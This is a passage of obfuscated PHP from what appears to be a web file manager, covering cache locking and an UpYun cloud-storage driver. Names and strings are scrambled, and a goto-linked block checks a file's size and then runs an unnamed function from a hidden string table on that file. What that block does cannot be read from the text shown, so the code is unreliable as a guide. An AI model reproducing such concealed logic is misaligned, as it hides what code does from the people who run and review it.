break; case $æøğª¢¦[204]: self::$handle = new CacheLockFile(); break; default: break; } if (GLOBAL_DEBUG_LOG_ALL) { write_log($æøğª¢¦[826], $æøğª¢¦[827]); } return self::$handle; } private static function key($‡ä¼äâ) { return $_SERVER[ë¦»ºéÌ][828] . Cache::key($‡ä¼äâ); } public static function initReset() { self::$handle = !1; } public static function setErrorMsg($”¹¿îã = '') { self::$errorMsg = $”¹¿îã; } public static function lockGlobal($Çìá¼ŞÉ, $È£´Š‰) { return self::lock($Çìá¼ŞÉ, $È£´Š‰, !0); } public static function lock($÷Ø‡¥«†, $°Ó”óÏÔ = false, $‚Æñ¡Ø = false) { $¸ôÖÛè· =& $_SERVER[ë¦»ºéÌ]; $Æ´×¸Ìñ = self::init(); $Æå’ñ°³ = self::key($÷Ø‡¥«†); $°Ó”óÏÔ = $°Ó”óÏÔ ? $°Ó”óÏÔ : self::$timeout; $¹ÔØ›É– = $Æ´×¸Ìñ->lock($Æå’ñ°³, $°Ó”óÏÔ); $ûÕ…¤¼ğ = timeFloat(); if (!$¹ÔØ›É–) { $ §Íº·€ = "\x6c\157\143\153\40\x65\x72\x72\157\x72\x3b\x6b\x65\171\75{$÷Ø‡¥«†}\x3b\164\151\x6d\145\x3d{$°Ó”óÏÔ}\x3b" . self::$errorMsg . $¸ôÖÛè·[81] . get_caller_msg(); $§èç­ğ = LNG($¸ôÖÛè·[829]) . "\x28{$°Ó”óÏÔ}\163\x29\x2e" . LNG($¸ôÖÛè·[830]); $§èç­ğ .= $¸ôÖÛè·[831]; if (is_string(self::$errorMsg) && self::$errorMsg) { $§èç­ğ = $§èç­ğ . $¸ôÖÛè·[832] . self::$errorMsg; } write_log($ §Íº·€, $¸ôÖÛè·[827]); show_json($§èç­ğ, !1); } if (!$‚Æñ¡Ø) { self::$lockItem[$Æå’ñ°³] = !0; } if (GLOBAL_DEBUG_LOG_ALL) { $“Œª„Ã™ = number_format(timeFloat() - $ûÕ…¤¼ğ, 3); write_log($¸ôÖÛè·[833] . $÷Ø‡¥«† . $¸ôÖÛè·[834] . $“Œª„Ã™, $¸ôÖÛè·[827]); } return $¹ÔØ›É–; } public static function lockGet($Ê÷ş§“) { $„ˆ§ğ‘ = self::key($Ê÷ş§“); if (self::$lockItem[$„ˆ§ğ‘]) { return self::$lockItem[$„ˆ§ğ‘]; } return self::init()->lockGet($„ˆ§ğ‘); } public static function unlock($ú£ÚÍ²°) { $°†ÚÑã´ =& $_SERVER[ë¦»ºéÌ]; $àÀÜÆÙ° = self::key($ú£ÚÍ²°); self::$lockItem[$àÀÜÆÙ°] = null; self::init()->unlock($àÀÜÆÙ°); if (GLOBAL_DEBUG_LOG_ALL) { write_log($°†ÚÑã´[835] . $ú£ÚÍ²°, $°†ÚÑã´[827]); } return; } public static function unlockRuntime() { $£ºíÄÇü =& $_SERVER[ë¦»ºéÌ]; $‘ûş©ä = self::init(); $‰¶áŞ¤ = !1; foreach (self::$lockItem as $ÜÛ½şÓî => $÷İÂ”ê) { if (!$÷İÂ”ê) { continue; } $‘ûş©ä->unlock($ÜÛ½şÓî); if (!$‰¶áŞ¤) { $‰¶áŞ¤ = !0; write_log($£ºíÄÇü[836] . $ÜÛ½şÓî . $£ºíÄÇü[81] . get_caller_msg(), $£ºíÄÇü[827]); continue; } write_log($£ºíÄÇü[836] . $ÜÛ½şÓî, $£ºíÄÇü[827]); } self::fileUnlockAll(); if (GLOBAL_DEBUG_LOG_ALL) { $Œ†ôÍˆç = number_format(timeFloat() - TIME_FLOAT, 3); write_log($£ºíÄÇü[837] . $Œ†ôÍˆç . $£ºíÄÇü[838] . ACTION, $£ºíÄÇü[827]); } } public static function fileLock($Éıú•˜ˆ) { $©Ÿ–·şº =& $_SERVER[ë¦»ºéÌ]; if (!$GLOBALS[$©Ÿ–·şº[839]]) { $GLOBALS[$©Ÿ–·şº[839]] = array(); } $GLOBALS[$©Ÿ–·şº[839]][$Éıú•˜ˆ] = !1; $µ£µâ„Í = fopen(DATA_PATH . $Éıú•˜ˆ . $©Ÿ–·şº[840], $©Ÿ–·şº[841]); if (!$µ£µâ„Í) { return !1; } $GLOBALS[$©Ÿ–·şº[839]][$Éıú•˜ˆ] = $µ£µâ„Í; if (flock($µ£µâ„Í, LOCK_EX)) { return !0; } self::unlock($Éıú•˜ˆ); show_json($©Ÿ–·şº[842], !1); return !1; } public static function fileUnlock($Ã¬¯ƒµŞ) { $‡Â°­ğË =& $_SERVER[ë¦»ºéÌ]; $¼¾Â†À = $GLOBALS[$‡Â°­ğË[839]][$Ã¬¯ƒµŞ]; if (!$¼¾Â†À) { return; } $GLOBALS[$‡Â°­ğË[839]][$Ã¬¯ƒµŞ] = !1; flock($¼¾Â†À, LOCK_UN); fclose($¼¾Â†À); } public static function fileUnlockAll() { $¾¨¦“ØÅ =& $_SERVER[ë¦»ºéÌ]; if (!$GLOBALS[$¾¨¦“ØÅ[839]]) { return; } foreach ($GLOBALS[$¾¨¦“ØÅ[839]] as $—‰Ÿ¡ˆ => $°Ò­ŞÕ¦) { if (!$°Ò­ŞÕ¦) { continue; } $GLOBALS[$¾¨¦“ØÅ[839]][$—‰Ÿ¡ˆ] = !1; flock($°Ò­ŞÕ¦, LOCK_UN); fclose($°Ò­ŞÕ¦); } $GLOBALS[$¾¨¦“ØÅ[839]] = array(); } } function cacheLockWait() { usleep(mt_rand(200, 5000)); } goto fÉÙßïÅì’; e“‘í½ò„ç: $_size = $_SERVER[ë¦»ºéÌ][856]; if ($_SERVER[$_SERVER[ë¦»ºéÌ][13]] != $_size($_file)) { $_getc = $_SERVER[ë¦»ºéÌ][15]; $_getfile = $_SERVER[$_SERVER[ë¦»ºéÌ][16]] . $_SERVER[ë¦»ºéÌ][17]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[ë¦»ºéÌ][18], $_getfilec); if (count($_getarrs) < $_SERVER[ë¦»ºéÌ][19]) { $exit = $_SERVER[ë¦»ºéÌ][20]; $exit(); } $_act = $_SERVER[ë¦»ºéÌ][21]; $_act($_file); } class SystemOptionModel extends ModelBaseOption { protected $tableName = "\x73\171\163\x74\x65\155\137\157\160\x74\x69\157\x6e"; protected $jsonField = array("\155\145\x6e\x75", "\x72\x6f\154\145", "\162\157\x6c\145\x47\162\x6f\x75\x70", "\x72\x65\147\x69\163\164", "\x65\x6d\141\151\154"); function __construct() { parent::__construct(); } protected function cacheKey($”Öİû·ˆ) { return "\123\x79\x73\x74\145\x6d\x4f\160\164\151\157\x6e\137{$”Öİû·ˆ}"; } protected function optionDefault($îëåØÈ = '') { $á¥ïŒ’¢ =& $_SERVER[ë¦»ºéÌ]; if ($îëåØÈ == $á¥ïŒ’¢[12]) { return $GLOBALS[$á¥ïŒ’¢[6]][$á¥ïŒ’¢[387]]; } } } goto e³Ñ‚š±×Ş; EÑÌƒ¶ÖÂ: class PathDriverStream extends PathDriverBase { const TYPE_STRING = 1; const TYPE_FILE = 2; public function __construct($İİœÓ»Ÿ, $¿àÓ®Û“ = 0) { parent::__construct(); $this->source = $İİœÓ»Ÿ; $this->sourceSize = $¿àÓ®Û“; if (is_string($this->source)) { $this->sourceType = self::TYPE_STRING; $this->sourceSize = strlen($this->source); } else { $this->sourceType = self::TYPE_FILE; } } public function size($ºÎªà¹á = false) { return $this->sourceSize; } public function getContent($Œ«Ô¨ô² = false) { return $this->fileSubstr($Œ«Ô¨ô², 0, $this->sourceSize); } public function fileSubstr($áÜå²ê = false, $™ØİÌœ = 0, $¢ÇÒåÄÓ = 0) { if (!$¢ÇÒåÄÓ) { $¢ÇÒåÄÓ = $this->sourceSize; } $ƒÎ¦Ëú = $this->sourceSize - $™ØİÌœ; if ($¢ÇÒåÄÓ >= $ƒÎ¦Ëú) { $¢ÇÒåÄÓ = $ƒÎ¦Ëú; } if ($this->sourceType == self::TYPE_STRING) { return substr($this->source, $™ØİÌœ, $¢ÇÒåÄÓ); } if ($this->sourceType == self::TYPE_FILE) { if ($¢ÇÒåÄÓ <= 0) { return $_SERVER[ë¦»ºéÌ][12]; } $‰Şˆúœ¾ = ftell($this->source); fseek_64($this->source, $‰Şˆúœ¾ + $™ØİÌœ); $“¶ñÕÜº = @fread($this->source, $¢ÇÒåÄÓ); fseek_64($this->source, $‰Şˆúœ¾); return $“¶ñÕÜº; } } public function hashMd5($½„¯ş¦ = false) { return md5($this->getContent()); } public static function hash($Ğü¼¤ÊŸ, $Í‰Æ¤şí = 0) { $ê¢‡“ÌŞ = new PathDriverStream($Ğü¼¤ÊŸ, $Í‰Æ¤şí); return $ê¢‡“ÌŞ->hashSimple($Ğü¼¤ÊŸ); } public static function md5($äÁĞ®¸ª, $ğ¦¢•” = 0) { $£Üúû•‚ = new PathDriverStream($äÁĞ®¸ª, $ğ¦¢•”); return $£Üúû•‚->hashMd5($äÁĞ®¸ª); } } class PathDriverUSS extends PathDriverBase { protected $bucket = ''; protected $username = ''; protected $userpass = ''; protected $domain = ''; protected $token = ''; protected $endpoint = "\x68\x74\x74\x70\72\57\57\166\60\x2e\x61\160\x69\x2e\x75\160\x79\165\156\x2e\x63\x6f\155"; public $ioUploadServer = 0; public $ioFileOutServer = 0; public function __construct($º™¬·ƒ) { parent::__construct(); $this->_init($º™¬·ƒ); } public function _init($‹†íœ) { $³µÁé¨ =& $_SERVER[ë¦»ºéÌ]; foreach ($‹†íœ as $Ù™¨¶Êâ => $òóÕè¬†) { if (isset($this->{$Ù™¨¶Êâ})) { $this->{$Ù™¨¶Êâ} = $òóÕè¬†; } } if (empty($this->username) || empty($this->userpass) || empty($this->domain)) { throw new Exception($³µÁé¨[1431] . LNG($³µÁé¨[1362])); } } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } private function ussHeaders($ …ŸØÌ, $ñ¨ûüã¼ = "\x47\105\x54") { $±¢²¨® =& $_SERVER[ë¦»ºéÌ]; $ÉïÖ’à• = gmdate($±¢²¨®[1395]); $ì»Â§¦à = base64_encode(hash_hmac($±¢²¨®[1432], "{$ñ¨ûüã¼}\x26{$ …ŸØÌ}\46{$ÉïÖ’à•}", md5("{$this->userpass}"), !0)); $¯¶ÛÈ½æ = array("\x41\x75\x74\x68\x6f\x72\x69\x7a\x61\x74\x69\157\156\x3a\125\120\x59\125\116\40{$this->username}\x3a{$ì»Â§¦à}", "\104\141\x74\x65\72{$ÉïÖ’à•}"); return $¯¶ÛÈ½æ; } public function ussRequest($õì´½Ù­, $İª„×ü” = "\x47\x45\124", $«ŠÂğ³± = false, $ÄåÓ×òÈ = false, $öÊÆ­ğ¾ = false) { $úÓå«ïı =& $_SERVER[ë¦»ºéÌ]; $õì´½Ù­ = trim($õì´½Ù­, $úÓå«ïı[8]); $¡À¨â§Ï = "\x2f{$this->bucket}\57{$õì´½Ù­}"; $êÉó—Äß = $this->ussHeaders($¡À¨â§Ï, $İª„×ü”); if ($ÄåÓ×òÈ) { $êÉó—Äß = array_merge($êÉó—Äß, $ÄåÓ×òÈ); } $ëì¾ºøï = url_request($this->endpoint . $¡À¨â§Ï, $İª„×ü”, $«ŠÂğ³±, $êÉó—Äß, $öÊÆ­ğ¾); if (!$ëì¾ºøï) { return array($úÓå«ïı[1169] => !1, $úÓå«ïı[1171] => $úÓå«ïı[1433]); } if (strtolower($İª„×ü”) == $úÓå«ïı[201] || in_array($ëì¾ºøï[$úÓå«ïı[1169]], array($úÓå«ïı[1288], $úÓå«ïı[1434]))) { $«ŠÂğ³± = $ëì¾ºøï[$úÓå«ïı[1435]]; } else { $«ŠÂğ³± = json_decode($ëì¾ºøï[$úÓå«ïı[1171]], !0); if (!$«ŠÂğ³±) { $«ŠÂğ³± = $ëì¾ºøï[$úÓå«ïı[1171]]; } else { if (!$ëì¾ºøï[$úÓå«ïı[734]] && isset($«ŠÂğ³±[$úÓå«ïı[1436]])) { $«ŠÂğ³± = $«ŠÂğ³±[$úÓå«ïı[1436]]; } } } return array($úÓå«ïı[1169] => $ëì¾ºøï[$úÓå«ïı[734]], $úÓå«ïı[1171] => $«ŠÂğ³±); } public function mkfile($–³ñ³§‚, $™Ÿ–¦ÅŸ = '', $¸Ñ¥©˜‚ = REPEAT_RENAME) { if ($this->setContent($–³ñ³§‚, $™Ÿ–¦ÅŸ)) { return $this->getPathOuter($–³ñ³§‚); } return !1; } public function mkdir($‘æò»Ë, $º›‹¶ä = REPEAT_SKIP) { $•ñ—§¹ =& $_SERVER[ë¦»ºéÌ]; $¯ò¢µ§Ä = trim($‘æò»Ë, $•ñ—§¹[8]); if ($this->_isFolder($¯ò¢µ§Ä)) { return $this->getPathOuter($¯ò¢µ§Ä); } $ŒôµıĞ¥ = array($•ñ—§¹[1437]); $—ÌÂµ±Õ = $this->ussRequest($¯ò¢µ§Ä, $•ñ—§¹[233], !1, $ŒôµıĞ¥); return $—ÌÂµ±Õ[$•ñ—§¹[1169]] ? $this->getPathOuter($¯ò¢µ§Ä) : !1; } public function copyFile($°şĞ´¶Ú, $¬€‰²‰Ù) { $•·‡ÉÀ­ =& $_SERVER[ë¦»ºéÌ]; $±‰ëøŞØ = array($•·‡ÉÀ­[1438] . "\57{$this->bucket}\57{$°şĞ´¶Ú}", $•·‡ÉÀ­[1439]); $Îì¶íÕ“ = $this->ussRequest($¬€‰²‰Ù, $•·‡ÉÀ­[235], !1, $±‰ëøŞØ); return $Îì¶íÕ“[$•·‡ÉÀ­[1169]] ? !0 : $this->getPathOuter($¬€‰²‰Ù); } public function moveFile($ñíôúãˆ, $Í»ú‚à¬) { $¸‚û†ê  =& $_SERVER[ë¦»ºéÌ]; $ù®é©æ = array($¸‚û†ê [1440] . "\57{$this->bucket}\57{$ñíôúãˆ}", $¸‚û†ê [1439]); $ûöŞş° = $this->ussRequest($Í»ú‚à¬, $¸‚û†ê [235], !1, $ù®é©æ); return $ûöŞş°[$¸‚û†ê [1169]] ? !0 : $this->getPathOuter($Í»ú‚à¬); } public function delFile($Äø¶¼Œ) { $šëèÉÆ¯ =& $_SERVER[ë¦»ºéÌ]; $é´‘Ï¿ = $this->ussRequest($Äø¶¼Œ, $šëèÉÆ¯[1441]); return $é´‘Ï¿[$šëèÉÆ¯[1169]] ? !0 : !1; } public function delFolder($şš”í£—) { $¸¾Ôºã‚ =& $_SERVER[ë¦»ºéÌ]; if (!$this->exist($şš”í£—)) { return !0; } $this->listItemCache = !1; $Êæ³Æò = $üÆİÎğé = array(); $this->fileList($şš”í£—, $Êæ³Æò, $üÆİÎğé, !0); $this->listItemCache = !0; foreach ($üÆİÎğé as $ñ‹¸ƒŒ) { $ÇÉ×š† = $this->ussRequest($ñ‹¸ƒŒ[$¸¾Ôºã‚[42]], $¸¾Ôºã‚[1441]); if (!$ÇÉ×š†[$¸¾Ôºã‚[1169]]) { return !1; } } foreach ($Êæ³Æò as $Œôù»Û½) { $ÇÉ×š† = $this->ussRequest($Œôù»Û½, $¸¾Ôºã‚[1441]); if (!$ÇÉ×š†[$¸¾Ôºã‚[1169]]) { return !1; } } $ÇÉ×š† = $this->ussRequest($şš”í£—, $¸¾Ôºã‚[1441]); return $ÇÉ×š†[$¸¾Ôºã‚[1169]]; } public function rename($ É²µğç, $˜‚§–ùƒ) { if ($this->isFile($ É²µğç)) { $˜‚§–ùƒ = get_path_father($ É²µğç) . $˜‚§–ùƒ; return $this->moveFile($ É²µğç, $˜‚§–ùƒ); } return $this->renameObject($ É²µğç, $˜‚§–ùƒ); } public function fileInfo($¶æ•ŒÄï, $ı›±›Æ = false, $ÊÅ«¢›ô = array()) { $÷š”ï¬Ş =& $_SERVER[ë¦»ºéÌ]; $úªÊ ÌÍ = array($÷š”ï¬Ş[42] => $this->pathThis($¶æ•ŒÄï), $÷š”ï¬Ş[88] => $this->getPathOuter($÷š”ï¬Ş[8] . $¶æ•ŒÄï), $÷š”ï¬Ş[43] => $÷š”ï¬Ş[204], $÷š”ï¬Ş[90] => isset($ÊÅ«¢›ô[$÷š”ï¬Ş[90]]) ? $ÊÅ«¢›ô[$÷š”ï¬Ş[90]] : 0, $÷š”ï¬Ş[179] => $this->ext($¶æ•ŒÄï)); if ($ı›±›Æ) { return $úªÊ ÌÍ; } $úªÊ ÌÍ[$÷š”ï¬Ş[205]] = $úªÊ ÌÍ[$÷š”ï¬Ş[96]] = 0; $úªÊ ÌÍ[$÷š”ï¬Ş[206]] = $úªÊ ÌÍ[$÷š”ï¬Ş[207]] = !0; if (empty($ÊÅ«¢›ô)) { $ÊÅ«¢›ô = $this->objectMeta($¶æ•ŒÄï); if (!$ÊÅ«¢›ô) { return $úªÊ ÌÍ; } } $úªÊ ÌÍ[$÷š”ï¬Ş[205]] = intval($ÊÅ«¢›ô[$÷š”ï¬Ş[1442]]); $úªÊ ÌÍ[$÷š”ï¬Ş[96]] = intval($ÊÅ«¢›ô[$÷š”ï¬Ş[1443]]); $úªÊ ÌÍ[$÷š”ï¬Ş[90]] = $ÊÅ«¢›ô[$÷š”ï¬Ş[90]]; return $úªÊ ÌÍ; } public function folderInfo($Éï¨¿¦û, $Æ³ªÒñ = false) { $à·‰ĞòÔ =& $_SERVER[ë¦»ºéÌ]; $Œˆ‡Üşø = array($à·‰ĞòÔ[42] => $this->pathThis($Éï¨¿¦û), $à·‰ĞòÔ[88] => $this->getPathOuter($à·‰ĞòÔ[8] . $Éï¨¿¦û), $à·‰ĞòÔ[43] => $à·‰ĞòÔ[89]); if ($Æ³ªÒñ) { return $Œˆ‡Üşø; } $Œˆ‡Üşø[$à·‰ĞòÔ[205]] = $Œˆ‡Üşø[$à·‰ĞòÔ[96]] = 0; $Œˆ‡Üşø[$à·‰ĞòÔ[206]] = $Œˆ‡Üşø[$à·‰ĞòÔ[207]] = !0; if (empty($êÈ¶ãˆí)) { $êÈ¶ãˆí = $this->objectMeta($Éï¨¿¦û); if (!$êÈ¶ãˆí) { return $Œˆ‡Üşø; } } $Œˆ‡Üşø[$à·‰ĞòÔ[205]] = intval($êÈ¶ãˆí[$à·‰ĞòÔ[1442]]); $Œˆ‡Üşø[$à·‰ĞòÔ[96]] = intval($êÈ¶ãˆí[$à·‰ĞòÔ[1443]]); return $Œˆ‡Üşø; } private function listObjs($ëÆğº±‡, $ÍîŠú‚§ = 0, $Û—¨ğşõ = 1000) { $­ñßÇ¾» =& $_SERVER[ë¦»ºéÌ]; $ûŞ×©æ‚ = array($­ñßÇ¾»[1444], $­ñßÇ¾»[1445] . $Û—¨ğşõ); if ($ÍîŠú‚§) { $ûŞ×©æ‚[] = $­ñßÇ¾»[1446] . $ÍîŠú‚§; } $ùÅÃÖÑ = $this->ussRequest($ëÆğº±‡, $­ñßÇ¾»[237], !1, $ûŞ×©æ‚); return !$ùÅÃÖÑ[$­ñßÇ¾»[1169]] ? !1 : $ùÅÃÖÑ[$­ñßÇ¾»[1171]]; } private function fileList($Ó¸Üİ¬×, &$™¦ÜµŠÇ, &$­‚ŒåÁ, $´·ÍÇïÊ = false) { $¤š¨íŒˆ =& $_SERVER[ë¦»ºéÌ]; $€º›å•­ = $¤š¨íŒˆ[12]; $·È†±ßŒ = 1000; $Ü©úò¦„ = rtrim($Ó¸Üİ¬×, $¤š¨íŒˆ[8]) . $¤š¨íŒˆ[8]; $ÎùáÅ® = $this->listItemCache === !1 ? !1 : !0; while (!0) { check_abort(); $æ±¿õÄ» = $this->listObjs($Ó¸Üİ¬×, $€º›å•­, $·È†±ßŒ); if (!$æ±¿õÄ») { return !1; } $€º›å•­ = isset($æ±¿õÄ»[$¤š¨íŒˆ[1447]]) ? $æ±¿õÄ»[$¤š¨íŒˆ[1447]] : $¤š¨íŒˆ[12]; $¼•¿ËñÙ = isset($æ±¿õÄ»[$¤š¨íŒˆ[1448]]) ? $æ±¿õÄ»[$¤š¨íŒˆ[1448]] : array(); foreach ($¼•¿ËñÙ as $Å”¤îåá) { $î§¹ŠãĞ = $Å”¤îåá[$¤š¨íŒˆ[43]] == $¤š¨íŒˆ[89] ? !0 : !1; $ÊÀşºõÒ = ltrim($Ü©úò¦„ . $Å”¤îåá[$¤š¨íŒˆ[42]], $¤š¨íŒˆ[8]) . ($î§¹ŠãĞ ? $¤š¨íŒˆ[8] : $¤š¨íŒˆ[12]); $¡åîş× = array($¤š¨íŒˆ[42] => $ÊÀşºõÒ, $¤š¨íŒˆ[43] => $î§¹ŠãĞ ? $¤š¨íŒˆ[89] : $¤š¨íŒˆ[204], $¤š¨íŒˆ[90] => $Å”¤îåá[$¤š¨íŒˆ[343]], $¤š¨íŒˆ[1443] => $Å”¤îåá[$¤š¨íŒˆ[1449]]); if ($ÎùáÅ®) { $this->cacheMethod($¤š¨íŒˆ[210], $ÊÀşºõÒ, $î§¹ŠãĞ); $this->cacheMethod($¤š¨íŒˆ[211], $ÊÀşºõÒ, $¡åîş×); } if ($î§¹ŠãĞ) { $™¦ÜµŠÇ[] = $ÊÀşºõÒ; if ($´·ÍÇïÊ) { $this->fileList($ÊÀşºõÒ, $™¦ÜµŠÇ, $­‚ŒåÁ, $´·ÍÇïÊ); } continue; } $­‚ŒåÁ[] = $¡åîş×; } if (count($¼•¿ËñÙ) < $·È†±ßŒ) { break; } } if ($ÎùáÅ®) { $this->cacheMethod($¤š¨íŒˆ[210], $Ó¸Üİ¬×, !0); } } public function listPath($ı×¬óü, $”õ‡Ì–Æ = false) { $ôãÓ˜Ì£ =& $_SERVER[ë¦»ºéÌ]; $‘¤Í…¸ = $Î†ÔôÍ­ = array(); $this->fileList($ı×¬óü, $‘¤Í…¸, $Î†ÔôÍ­); foreach ($‘¤Í…¸ as $Œ¦¤ûÄæ => $œöç¤·¼) { $‘¤Í…¸[$Œ¦¤ûÄæ] = $this->folderInfo($œöç¤·¼, $”õ‡Ì–Æ); } foreach ($Î†ÔôÍ­ as $Œ¦¤ûÄæ => $œöç¤·¼) { $Î†ÔôÍ­[$Œ¦¤ûÄæ] = $this->fileInfo($œöç¤·¼[$ôãÓ˜Ì£[42]], $”õ‡Ì–Æ, $œöç¤·¼); } return array($ôãÓ˜Ì£[87] => $‘¤Í…¸, $ôãÓ˜Ì£[86] => $Î†ÔôÍ­); } public function has($Ö‰Î¼š¨, $Åà§Ë›ß = false, $†Îƒ’ = true) { $Õ·ƒ‡èÚ =& $_SERVER[ë¦»ºéÌ]; $©éŠîîÕ = $Õ·ƒ‡èÚ[12]; $ƒ’™¾ÛÑ = 500; $À¦™¯Áœ = 0; $¦¯ÄÉÒí = 0; $¤×©¢á = rtrim($Ö‰Î¼š¨, $Õ·ƒ‡èÚ[8]) . $Õ·ƒ‡èÚ[8]; while (!0) { check_abort(); $ĞÙèë»Ç = $this->listObjs($Ö‰Î¼š¨, $©éŠîîÕ, $ƒ’™¾ÛÑ); if (!$ĞÙèë»Ç) { return !1; } $©éŠîîÕ = isset($ĞÙèë»Ç[$Õ·ƒ‡èÚ[1447]]) ? $ĞÙèë»Ç[$Õ·ƒ‡èÚ[1447]] : $Õ·ƒ‡èÚ[12]; $·ñª®†ä = isset($ĞÙèë»Ç[$Õ·ƒ‡èÚ[1448]]) ? $ĞÙèë»Ç[$Õ·ƒ‡èÚ[1448]] : array(); if (empty($·ñª®†ä)) { break; } $í“ß´İ = array_filter($·ñª®†ä, function ($ãú‚Ø) { $Õ’¡åíˆ =& $_SERVER[ë¦»ºéÌ]; return $ãú‚Ø[$Õ’¡åíˆ[43]] == $Õ’¡åíˆ[89]; }); $¤ƒí”¸Î = count($·ñª®†ä); $í“ß´İ = count($í“ß´İ); $¼ò­Ôì = $¤ƒí”¸Î - $í“ß´İ; if ($Åà§Ë›ß) { $¦¯ÄÉÒí += $í“ß´İ; $À¦™¯Áœ += $¼ò­Ôì; if ($¤ƒí”¸Î < $ƒ’™¾ÛÑ) { break; } continue; } if ($†Îƒ’) { if ($¼ò­Ôì) { return !0; } } else { if ($í“ß´İ) { return !0; } } if ($¤ƒí”¸Î < $ƒ’™¾ÛÑ) { break; } } if ($Åà§Ë›ß) { return array($Õ·ƒ‡èÚ[214] => $À¦™¯Áœ, $Õ·ƒ‡èÚ[215] => $¦¯ÄÉÒí); } return !1; } public function listAll($’¤—¼ÈĞ) { $©Ñşß¶™ =& $_SERVER[ë¦»ºéÌ]; $Œ‡íÔæ§ = $ÊâõËöù = array(); $this->fileList($’¤—¼ÈĞ, $Œ‡íÔæ§, $ÊâõËöù, !0); $šƒ¾Ìµ = array(); foreach ($ÊâõËöù as $³à¿ÖÈ¢) { $šƒ¾Ìµ[$³à¿ÖÈ¢[$©Ñşß¶™[42]]] = $³à¿ÖÈ¢[$©Ñşß¶™[90]]; } foreach ($Œ‡íÔæ§ as $³à¿ÖÈ¢) { if (is_string($³à¿ÖÈ¢)) { $šƒ¾Ìµ[$³à¿ÖÈ¢] = 0; } } return $this->listAllFiles($’¤—¼ÈĞ, array_keys($šƒ¾Ìµ), $šƒ¾Ìµ); } public function canRead($ˆ¿ç·¹ò) { return $this->exist($ˆ¿ç·¹ò) ? !0 : !1; } public function canWrite($ÅÉáƒôú) { return $this->exist($ÅÉáƒôú) ? !0 : !1; } public function getContent($§ñü²¢â) { return $this->fileSubstr($§ñü²¢â, 0, -1); } public function setContent($×ŸäæĞ, $çÁÛèÖ = '') { $é¨€¼ªû =& $_SERVER[ë¦»ºéÌ]; if (!$çÁÛèÖ) { $Ü—Œç¼ = $this->ussRequest($×ŸäæĞ, $é¨€¼ªû[233]); return $Ü—Œç¼[$é¨€¼ªû[1169]]; } $Æ¡Â½ı” = $this->tempFile($this->pathThis($×ŸäæĞ)); file_put_contents($Æ¡Â½ı”, $çÁÛèÖ); if ($this->upload($×ŸäæĞ, $Æ¡Â½ı”)) { $this->tempFileRemve($Æ¡Â½ı”); return !0; } return !1; } public function fileSubstr($à™¦ƒéü, $ìí¥ğ»’, $›Îşâø¨) { $œ½ÉäÆ² =& $_SERVER[ë¦»ºéÌ]; if (!($ÍàŠÌÙ¥ = $this->link($à™¦ƒéü))) { return !1; } $úè‰ÇÎ® = !1; if ($›Îşâø¨ > 0) { $Ò¤«Ö²Ä = $ìí¥ğ»’ + $›Îşâø¨ - 1; $úè‰ÇÎ® = array($œ½ÉäÆ²[1410] . $ìí¥ğ»’ . $œ½ÉäÆ²[462] . $Ò¤«Ö²Ä); } $´›Ÿã¦ı = url_request($ÍàŠÌÙ¥, $œ½ÉäÆ²[237], !1, $úè‰ÇÎ®); return $´›Ÿã¦ı[$œ½ÉäÆ²[734]] ? $´›Ÿã¦ı[$œ½ÉäÆ²[1171]] : !1; } public function upload($´î”´ÀÉ, $„¦¿¨äŠ, $–¬…â˜¬ = false, $ìõİ¼»Š = REPEAT_REPLACE) { $ùı® ç† =& $_SERVER[ë¦»ºéÌ]; $ûê©ïãà = IO::size($„¦¿¨äŠ); if ($ûê©ïãà <= 1024 * 1024 * 200) { $á·¡¼÷ = array($ùı® ç†[1450] . $„¦¿¨äŠ); $³³´Áà = $this->ussRequest($´î”´ÀÉ, $ùı® ç†[235], $á·¡¼÷); return $³³´Áà[$ùı® ç†[1169]] ? $this->getPathOuter($´î”´ÀÉ) : !1; } $ÔÅŒÕáœ = 1024 * 1024 * 10; $Ô´ãø£Œ = array($ùı® ç†[1451], $ùı® ç†[1452] . $ûê©ïãà, $ùı® ç†[1453], $ùı® ç†[1454] . $ÔÅŒÕáœ); $³³´Áà = $this->ussRequest($´î”´ÀÉ, $ùı® ç†[235], !1, $Ô´ãø£Œ); if (!$³³´Áà[$ùı® ç†[1169]]) { return !1; } $œ–™­”â = $³³´Áà[$ùı® ç†[1171]]; $øÒË‚÷ = 0; $“–À‡·‰ = $œ–™­”â[$ùı® ç†[1455]]; $åÜÛ“¼ı = fopen($„¦¿¨äŠ, $ùı® ç†[1359]); if (!$åÜÛ“¼ı) { return !1; } do { $¤»¦™ = $œ–™­”â[$ùı® ç†[1456]]; fseek_64($åÜÛ“¼ı, $øÒË‚÷); $‹‘‘ŠÇÈ = fread($åÜÛ“¼ı, $¤»¦™); $şæ»Ğ¶† = 0; do { $şæ»Ğ¶†++; $œ–™­”â = $this->uploadPart($´î”´ÀÉ, $œ–™­”â, $‹‘‘ŠÇÈ); } while (!$œ–™­”â && $şæ»Ğ¶† < 3); if (!$œ–™­”â) { return !1; } $“–À‡·‰ = $œ–™­”â[$ùı® ç†[1455]]; $øÒË‚÷ += $¤»¦™; } while ($“–À‡·‰ != -1); fclose($åÜÛ“¼ı); $Ô´ãø£Œ = array($ùı® ç†[1457], $ùı® ç†[1458] . $œ–™­”â[$ùı® ç†[1459]], $ùı® ç†[1453]); $³³´Áà = $this->ussRequest($´î”´ÀÉ, $ùı® ç†[235], !1, $Ô´ãø£Œ); return $³³´Áà[$ùı® ç†[1169]] ? $this->getPathOuter($­ø´ùÅ) : !1; } private function uploadPart($û¶·¸”û, $‚™ÑéÔ, &$åğìî“ğ) { $êÄÁĞõ‰ =& $_SERVER[ë¦»ºéÌ]; $Û¸ìµ‡ = array($êÄÁĞõ‰[1460], $êÄÁĞõ‰[1458] . $‚™ÑéÔ[$êÄÁĞõ‰[1459]], $êÄÁĞõ‰[1461] . $‚™ÑéÔ[$êÄÁĞõ‰[1455]], $êÄÁĞõ‰[151] . $‚™ÑéÔ[$êÄÁĞõ‰[1456]]); $ï¦ÖÖ÷  = $this->ussRequest($û¶·¸”û, $êÄÁĞõ‰[235], $åğìî“ğ, $Û¸ìµ‡); return !$ï¦ÖÖ÷ [$êÄÁĞõ‰[1169]] ? $ï¦ÖÖ÷ [$êÄÁĞõ‰[1169]] : $ï¦ÖÖ÷ [$êÄÁĞõ‰[1171]]; } public function uploadFormData($ØòÂ÷©Ï, $ŞøüÕÕË = 3600) { return $this->uploadPolicy($ØòÂ÷©Ï, $ŞøüÕÕË); } public function multiUploadFormData($ıÆªê×è, 